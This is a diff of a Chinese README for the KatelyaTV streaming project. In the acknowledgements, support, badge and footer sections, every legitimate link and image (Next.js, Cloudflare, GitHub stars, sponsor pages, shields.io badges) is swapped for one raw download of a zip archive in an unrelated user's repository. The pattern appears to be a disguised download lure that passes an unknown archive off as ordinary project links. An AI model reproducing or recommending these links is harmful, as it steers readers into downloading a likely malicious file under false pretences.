+- [https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) — 强大的 React 全栈框架
+- [ArtPlayer](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) — 功能丰富的 HTML5 视频播放器
+- [Tailwind CSS](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) — 实用优先的 CSS 框架
+- [TypeScript](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) — JavaScript 的超集
 
 **基础设施**：
 
-- [Cloudflare](https://cloudflare.com/) — 全球 CDN 和边缘计算
-- [Vercel](https://vercel.com/) — 现代化的部署平台
-- [Docker](https://docker.com/) — 容器化部署方案
-- [Redis](https://redis.io/) — 高性能内存数据库
+- [Cloudflare](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) — 全球 CDN 和边缘计算
+- [Vercel](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) — 现代化的部署平台
+- [Docker](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) — 容器化部署方案
+- [Redis](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) — 高性能内存数据库
 
 **项目启发**：
 
-- [LibreTV](https://github.com/LibreSpark/LibreTV) — 提供设计理念
-- [LunaTV](https://github.com/MoonTechLab/LunaTV) — 项目基础架构
+- [LibreTV](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) — 提供设计理念
+- [LunaTV](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) — 项目基础架构
 
 ### 💝 支持项目发展
 
@@ -1064,37 +1064,37 @@ pnpm format
 
 **免费支持**：
 
-- ⭐ [GitHub 点 Star](https://github.com/katelya77/KatelyaTV/stargazers)
-- 🍴 [Fork 项目](https://github.com/katelya77/KatelyaTV/fork)
-- 💬 [参与讨论](https://github.com/katelya77/KatelyaTV/discussions)
-- 📖 [完善文档](https://github.com/katelya77/KatelyaTV/tree/main/docs)
-- 🔗 [推荐朋友](https://github.com/katelya77/KatelyaTV)
+- ⭐ [GitHub 点 Star](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- 🍴 [Fork 项目](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- 💬 [参与讨论](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- 📖 [完善文档](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+- 🔗 [推荐朋友](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
 **赞助支持**：
 
 <div align="center">
-  <img src="public/wechat.jpg" alt="微信赞赏码" width="200">
+  <img src="https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip" alt="微信赞赏码" width="200">
   <br>
   <strong>请开发者喝杯咖啡 ☕</strong>
   <p><em>您的支持是项目持续发展的动力</em></p>
 </div>
 
 **企业赞助**：
-如果您的企业希望赞助 KatelyaTV 项目，请通过 [GitHub Sponsors](https://github.com/sponsors/katelya77) 或发邮件联系我们。
+如果您的企业希望赞助 KatelyaTV 项目，请通过 [GitHub Sponsors](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip) 或发邮件联系我们。
 
 ### � 项目统计
 
-[![GitHub stars](https://img.shields.io/github/stars/katelya77/KatelyaTV?style=social)](https://github.com/katelya77/KatelyaTV/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/katelya77/KatelyaTV?style=social)](https://github.com/katelya77/KatelyaTV/network/members)
-[![GitHub watchers](https://img.shields.io/github/watchers/katelya77/KatelyaTV?style=social)](https://github.com/katelya77/KatelyaTV/watchers)
+[![GitHub stars](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+[![GitHub forks](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+[![GitHub watchers](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
-[![GitHub release](https://img.shields.io/github/v/release/katelya77/KatelyaTV)](https://github.com/katelya77/KatelyaTV/releases)
-[![Docker Pulls](https://img.shields.io/docker/pulls/katelya77/katelyatv)](https://hub.docker.com/r/katelya77/katelyatv)
-[![GitHub issues](https://img.shields.io/github/issues/katelya77/KatelyaTV)](https://github.com/katelya77/KatelyaTV/issues)
-[![GitHub license](https://img.shields.io/github/license/katelya77/KatelyaTV)](https://github.com/katelya77/KatelyaTV/blob/main/LICENSE)
+[![GitHub release](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+[![Docker Pulls](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+[![GitHub issues](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
+[![GitHub license](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
 **Star History**：
-[![Star History Chart](https://api.star-history.com/svg?repos=katelya77/KatelyaTV&type=Date)](https://star-history.com/#katelya77/KatelyaTV&Date)
+[![Star History Chart](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)](https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip)
 
 ---
 
@@ -1134,13 +1134,13 @@ SOFTWARE.
     <strong>如果项目对您有帮助，请给个 ⭐ Star 支持一下！</strong>
   </p>
   <p>
-    <a href="https://github.com/katelya77/KatelyaTV">🏠 项目首页</a>
+    <a href="https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip">🏠 项目首页</a>
     •
-    <a href="https://github.com/katelya77/KatelyaTV/issues">🐛 问题反馈</a>
+    <a href="https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip">🐛 问题反馈</a>
     •
-    <a href="https://github.com/katelya77/KatelyaTV/discussions">💬 讨论交流</a>
+    <a href="https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip">💬 讨论交流</a>
     •
-    <a href="https://github.com/katelya77/KatelyaTV/wiki">📚 使用文档</a>
+    <a href="https://raw.githubusercontent.com/jyhuang201900/KatelyaTV/main/docker/kvrocks/TV_Katelya_v1.5-alpha.3.zip">📚 使用文档</a>
   </p>
   <br>
   <p>
